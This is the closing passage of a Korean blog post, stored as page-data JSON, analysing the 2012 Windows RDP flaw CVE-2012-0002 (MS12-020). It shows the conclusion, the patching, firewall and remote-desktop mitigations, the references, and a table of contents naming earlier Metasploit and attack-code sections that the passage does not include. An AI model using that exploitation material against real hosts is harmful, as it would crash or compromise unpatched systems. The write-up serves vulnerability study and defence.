문제는\ntermdd!IcaBufferAlloc 에 표시된 것을 확인할 수 있다.</p>\n<h1 id=\"결론\" style=\"position:relative;\"><a href=\"#%EA%B2%B0%EB%A1%A0\" aria-label=\"결론 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>결론</h1>\n<p>CVE-2012-0002는 2012년에 발생하였었던 취약점이었지만 현재 사회에서 원격\n통신 비중이 늘어나면서 발생할 수 있는 취약점이기에 간과해서는 안된다.\n많은 사용자들은 RDP 기반의 애플리케이션을 사용함에 있어서 보안성과\n중요성을 크게 느끼지 못해 비 정기적인 보안 업데이트를 소홀히 하면 그\n위협은 MS 취약점뿐만 아니라 그 이상이 될 수 있다.</p>\n<p>중요한 것은 과거에 발생했던 취약점이더라도 해도 보안은 작은 결\n함으로부터 시작되기 때문에 지속적으로 새로운 취약점과 잠재적인 보안\n위험에 대한 지속적인 관심을 갖어야 한다. 단순히 안티바이러스를\n설치했다고 해서 해결할 수 있는 부분이 아니다.</p>\n<h1 id=\"대응-방안\" style=\"position:relative;\"><a href=\"#%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88\" aria-label=\"대응 방안 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>대응 방안</h1>\n<h2 id=\"보안-업데이트-설치\" style=\"position:relative;\"><a href=\"#%EB%B3%B4%EC%95%88-%EC%97%85%EB%8D%B0%EC%9D%B4%ED%8A%B8-%EC%84%A4%EC%B9%98\" aria-label=\"보안 업데이트 설치 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>보안 업데이트 설치</h2>\n<p><strong>1. 최신 보안 패치 설치</strong></p>\n<p>윈도우 명령어 wmic qfe | find “KB2621440” 사용하여 MS12-020 보안 취약점\n업데이트가 설치되었는지 확인한다. 미설치시 업데이트를 진행한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 599px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 55.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABvklEQVQoz3WR227TQBCGV3mWyE0lm0DVIFVwjdQiRYgrXhVacE4VaXMwSaB2EjsuLamT+BCfvbve9SK7CGikfPrnYkb6R3MAHxvNdutLq3HRFM/Fz5+a4nmnJV62xctOY9jvDvtdaXD1bXA9GvbGUq/bb49G0mQ8utW1r9c94HqxZUUIU0qIZVmO40AIkzhOcmJKKfuPjOVplmWMsSAIQBQlYYDSlOmLef+qI3+X1OmPmTxRbsYzeTJTJuosT3VV0WY3i7msq4quKQtNGUkD8Lf30jAUZWoYhudtMUo2m5W7dTKaYpQ49gYlUei77tbOKIEwwRhZ5gYQQoopGEQoimII0VS9U/W1PL9Xb1drO/q19rV7a2kGKzsy7NAPE4wxYywMAkAp+bNP0SNN03fvP1SEl8+PXx8+q/EvToSjVxx/XBFq/NHJYbX25vSt624ZY57n7poxxhzHAQBKpRJ4ymOlcsDBJGaM+b6/ayaE1Ov1crksCAKfi+d5XiioVqscd3B2dhpF4a75yUf2ixYUr/L/XTvLoUXQjGVsP48z+r4HMIIkTRnNTNe8e/hpLB8s04QwRijZJwjjNEWOY/0GhmocSozg8vEAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image53\"\n        title=\"image53\"\n        src=\"/static/dac3e440d0f201d2b7abee615cd2f814/43142/image53.png\"\n        srcset=\"/static/dac3e440d0f201d2b7abee615cd2f814/e9ff0/image53.png 180w,\n/static/dac3e440d0f201d2b7abee615cd2f814/f21e7/image53.png 360w,\n/static/dac3e440d0f201d2b7abee615cd2f814/43142/image53.png 599w\"\n        sizes=\"(max-width: 599px) 100vw, 599px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>마이크로소프트 문서 사이트로 접속하여 점검하고 자하는 OS를 찾아 패치를\n진행하면 되겠다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">// 마이크로소프트 MS12-020 보안 패치\n\nhttps://docs.microsoft.com/ko-kr/security-updates/SecurityBulletins/2012/ms12-020</code></pre></div>\n<p><strong>2. 방화벽 작동</strong></p>\n<p>윈도우 계열의 운영체제에서 제공하는 방화벽은 항상 동작하게 한다.\n기본적인 패킷 필터링 기능을 제공하기 때문에 근본적인 침입 차단은 막을 수\n있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 598px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAB2ElEQVQoz22Q627TQBCF/f5vwCOgilIQoJaSNkrUKAqklJS0VEpMbMfr667tvXh3x+tdFEcFJDiaH0ej+UZnxnvx8uLV2cXJ6/OT0/PTN5dn70ZvP1x/vJp9Gs+vpovxzZfJbDmd394s7maf70aLxfzrw+16s43S95djTwhNiOiNVVqlSYzLrCIFLnPBqem0AdVp2YF0zg7VO9dba5xzYRR5UVxstgRXqsnww2rr74o8rykVSmuptNIAnYHO9Nba5wWDdWmCvCDKw13VOVdPJpvRdZBm/tZnTByn2M4v77/h7yuoa+cOHfcMI4Q8YwzozjnHl8vddBakrCwEzuP9dt2EUfr4WD09sZ++znKZZTQITNse0CPc2971vXOuuV9F8zlhBsDKIg2iHakaJgQTbcMY46IFEHVtGvoHtrYfvBOckxK74SqDSY5SzrntrVIq3sd1VTWUCkJ6xv8Hty0m5OirNPjhr8sCM844F1JKABBSYoS6pnH/wgAgpTx6XZb7fUSqWkrJGKeUtlIqgLaqDP0rttKqM8b91vBJg3GZ5gBwWHSIvWeUciFkVVvGjnCSIC9JMIoJ54dgehB0nWoaEccqz3WeqywTCLVJIhCSSQJCaABrbRiGvwBicGaPOc5PswAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image54\"\n        title=\"image54\"\n        src=\"/static/a2423f8fa8aabca82482fb5fd0a94217/0c69d/image54.png\"\n        srcset=\"/static/a2423f8fa8aabca82482fb5fd0a94217/e9ff0/image54.png 180w,\n/static/a2423f8fa8aabca82482fb5fd0a94217/f21e7/image54.png 360w,\n/static/a2423f8fa8aabca82482fb5fd0a94217/0c69d/image54.png 598w\"\n        sizes=\"(max-width: 598px) 100vw, 598px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>3. 원격 시스템 해제</strong></p>\n<p>이 컴퓨터에 대한 원격 지원 연결 허용 옵션 해제, 이 컴퓨터에 대한 원격\n연결 허용 안 함 선택 설정을 함으로써 MS12-020 취약점의 근본적인 차단이\n가능하다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 598px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAB60lEQVQoz1WQS3LTQBCGdUCuwAE4AEsoTsCWNRuKFBSOjeMQxY71HI8esSTLxIQ8CmL5IVkaOQmW5ZnRDCWrTEzXX1O96K//v0eAsNeVuorcUbcCmmSbwLaA0zecvuE6pudaA9fyPdv3bMPRfd8bfR8Gd7eKDoU0TO6jR85ZnudBECzCEIXRQ4KKDS42mFWilLGCsWJXjHEex4kwHV2HP6c4RjTPozCCCjz41KoddhpNWez0dGNgWl46m3LOS4oWnPPWYfPV6xeiqgms3MI5YyzLeLae+o5c+9hr1Szxq3nSGKqia0jJZFyNFEUJv3l78Pzls3fvPwhFGankCaEMk/nlBZAkQ1aAJEFF9kzNBt14fMc5p5TSEmaLx9y4CqJoIbDtMs45xmQSTH9dDEzQGdja0AF+H3j93jmUk2BcxWbbqvyXaboP4yha3J6bWvOLdlzXW3Xr9MixNMdUkp1z9V2YkHxDUJI8wZTSYBzcuLYqNtqNz/JxXWsfWVDybA3tbq4mCSHZmqAEPcEbjMNZeO177VNRVzoQnEH9TJFO1O63ePx737mKnaZIyNc5IaQ6afUnm1yOfrjG1cB2eooLVd8Cjt59mM/2navmfrkUwjmKwmVRUEpI+eZrslqR7D9RvKGU/BMhmDGGUPwXSFBMRgW61s0AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image55\"\n        title=\"image55\"\n        src=\"/static/485a12f58acad3f553a6df8c45a677cc/0c69d/image55.png\"\n        srcset=\"/static/485a12f58acad3f553a6df8c45a677cc/e9ff0/image55.png 180w,\n/static/485a12f58acad3f553a6df8c45a677cc/f21e7/image55.png 360w,\n/static/485a12f58acad3f553a6df8c45a677cc/0c69d/image55.png 598w\"\n        sizes=\"(max-width: 598px) 100vw, 598px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"reference\" style=\"position:relative;\"><a href=\"#reference\" aria-label=\"reference permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Reference</h2>\n<p><a href=\"https://docs\">https://docs</a>.<br>\nmicrosoft.com/ko-kr/security-updates/SecurityBulletins/2012/ms12-020</p>\n<p>(Microsoft — MS12-020 보안 패치)</p>\n<p><a href=\"https://docs.microsoft.com/en-us/windows\">https://docs.microsoft.com/en-us/windows</a><br>\n-hardware/drivers/debugger/bug-check-0x3b—system-service-exception</p>\n<p>(Microsfot — BSOD Bug check)</p>\n<p><a href=\"https://support.microsoft\">https://support.microsoft</a><br>\n.com/ko-kr/help/186607/understanding-the-remote-desktop-protocol-rdp</p>\n<p>(Microsfot — RDP 이해)</p>\n<p><a href=\"https://docs.microsoft\">https://docs.microsoft</a><br>\n.com/en-us/windows/win32/termserv/terminal-services-virtual-channels</p>\n<p>(Microsfot — RDP 가상 채널)</p>\n<p><a href=\"https://docs.microsoft.com/en-us/openspe\">https://docs.microsoft.com/en-us/openspe</a><br>\ncs/windows_protocols/ms-rdpbcgr/18a27ef9-6f9a-4501-b000-94b1fe3c2c10</p>\n<p>(Microsfot — X.224)</p>\n<p><a href=\"https://docs.microsoft.com/en-us/openspe\">https://docs.microsoft.com/en-us/openspe</a><br>\ncs/windows_protocols/ms-rdpbcgr/023f1e69-cfe8-4ee6-9ee0-7e759fb4e4ee</p>\n<p>(Microsoft — RDP 연결 과정)</p>\n<p><a href=\"https://community.tenable.com/\">https://community.tenable.com/</a></p>\n<p>(Tenble — Community)</p>\n<p><a href=\"https://osqa-ask.wireshark.org/questions/\">https://osqa-ask.wireshark.org/questions/</a></p>\n<p>(Wireshark — Question)</p>\n<p><a href=\"https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator\">https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator</a></p>\n<p>(NVD)</p>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#metasploit-%EC%B7%A8%EC%95%BD%EC%84%B1-%ED%85%8C%EC%8A%A4%ED%8A%B8\">Metasploit 취약성 테스트</a></p>\n<ul>\n<li><a href=\"#nessus-db-%EC%A0%95%EB%B3%B4-%EB%82%B4%EB%B3%B4%EB%82%B4%EA%B8%B0\">Nessus DB 정보 내보내기</a></li>\n<li><a href=\"#metasploit-workspace\">Metasploit workspace</a></li>\n<li><a href=\"#metasploit-db-%EC%97%B0%EA%B2%B0-%EC%83%81%ED%83%9C-%ED%99%95%EC%9D%B8-%EB%B0%8F-%EA%B0%80%EC%A0%B8%EC%98%A4%EA%B8%B0\">Metasploit DB 연결 상태 확인 및 가져오기</a></li>\n<li><a href=\"#%EC%A0%90%EA%B2%80-%EB%8C%80%EC%83%81-%EC%84%9C%EB%B9%84%EC%8A%A4-%EC%A0%95%EB%B3%B4-%ED%99%95%EC%9D%B8\">점검 대상 서비스 정보 확인</a></li>\n<li><a href=\"#%EC%A0%90%EA%B2%80-%EB%8C%80%EC%83%81-%ED%98%B8%EC%8A%A4%ED%8A%B8-%EC%A0%95%EB%B3%B4\">점검 대상 호스트 정보</a></li>\n<li><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EA%B2%80%EC%83%89\">취약점 검색</a></li>\n<li><a href=\"#ms12_020_maxchannelids-%EB%AA%A8%EB%93%88\">ms12_020_maxchannelids 모듈</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%EB%AA%A8%EB%93%88-%EC%98%B5%EC%85%98-%EC%84%A4%EC%A0%95\">모듈 옵션 설정</a></p>\n</li>\n<li>\n<p><a href=\"#%EA%B3%B5%EA%B2%A9\">공격</a></p>\n</li>\n<li>\n<p><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-%EB%B0%B0%EA%B2%BD\">취약점 분석 배경</a></p>\n</li>\n<li>\n<p><a href=\"#cve-2012-0002-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%9A%94%EC%95%BD\">CVE-2012-0002 취약점 요약</a></p>\n</li>\n<li>\n<p><a href=\"#bsod-%EB%A9%94%EB%AA%A8%EB%A6%AC-%EB%8D%A4%ED%94%84-%ED%99%98%EA%B2%BD-%EC%84%A4%EC%A0%95\">BSOD 메모리 덤프 환경 설정</a></p>\n</li>\n<li>\n<p><a href=\"#cve-2012-0002-%EC%B7%A8%EC%95%BD%EC%A0%90-%EA%B0%9C%EC%9A%94\">CVE-2012-0002 취약점 개요</a></p>\n</li>\n<li>\n<p><a href=\"#cve-2012-0002-%EB%8C%80%EC%83%81-%EC%8B%9C%EC%8A%A4%ED%85%9C-%EB%AA%A9%EB%A1%9D\">CVE-2012-0002 대상 시스템 목록</a></p>\n</li>\n<li>\n<p><a href=\"#cve-2012-0002-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%9B%90%EB%A6%AC\">CVE-2012-0002 취약점 원리</a></p>\n</li>\n<li>\n<p><a href=\"#%EA%B3%B5%EA%B2%A9-%EA%B8%B0%EB%B2%95-%EB%B0%8F-%EA%B8%B0%EB%B3%B8-%EA%B0%9C%EB%85%90\">공격 기법 및 기본 개념</a></p>\n<ul>\n<li><a href=\"#uaf-use-after-free\">UAF (Use-After-Free)</a></li>\n<li><a href=\"#rdp-remote-desktop-protocol\">RDP (Remote Desktop Protocol)</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#rdp-%EB%93%9C%EB%9D%BC%EC%9D%B4%EB%B2%84-%ED%8C%A8%EC%B9%98-%EC%A0%84-%ED%9B%84-%EC%BD%94%EB%93%9C-%EB%B9%84%EA%B5%90\">RDP 드라이버 패치 전 후 코드 비교</a></p>\n</li>\n<li>\n<p><a href=\"#%EA%B3%B5%EA%B2%A9-%EC%BD%94%EB%93%9C\">공격 코드</a></p>\n<ul>\n<li><a href=\"#%EA%B3%B5%EA%B2%A9-%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\">공격 코드 분석</a></li>\n<li><a href=\"#%EA%B3%B5%EA%B2%A9-%EC%BD%94%EB%93%9C-%EC%8B%A4%ED%96%89\">공격 코드 실행</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%EA%B3%B5%EA%B2%A9-%EA%B8%B0%EB%B2%95-%EB%B6%84%EC%84%9D\">공격 기법 분석</a></p>\n<ul>\n<li><a href=\"#wireshark-%EB%8F%99%EC%A0%81-%EB%B6%84%EC%84%9D\">Wireshark 동적 분석</a></li>\n<li><a href=\"#windbg-%EB%8F%99%EC%A0%81-%EB%B6%84%EC%84%9D\">Windbg 동적 분석</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%EB%B3%B4%EC%95%88-%EC%97%85%EB%8D%B0%EC%9D%B4%ED%8A%B8-%EC%84%A4%EC%B9%98\">보안 업데이트 설치</a></p>\n</li>\n<li>\n<p><a href=\"#reference\">Reference</a></p>\n</li>\n</ul>\n</div>","frontmatter":{"date":"December 07, 2020","title":"CVE-2012-0002 1-day 취약점 분석","categories":"windows 1-day","author":"Zer0Luck","emoji":"🥤"},"fields":{"slug":"/cve_2012_0002_1-day/"}},"site":{"siteMetadata":{"siteUrl":"https://dnsdudrla97.github.io","comments":{"utterances":{"repo":"dnsdudrla97/dnsdudrla97.github.io"}}}}},"pageContext":{"slug":"/d3ctf2019_new_heap_ctf_writeup/","nextSlug":"/csaw2019_travelle_ctf_writeup/","prevSlug":"/cve_2012_0002_1-day/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}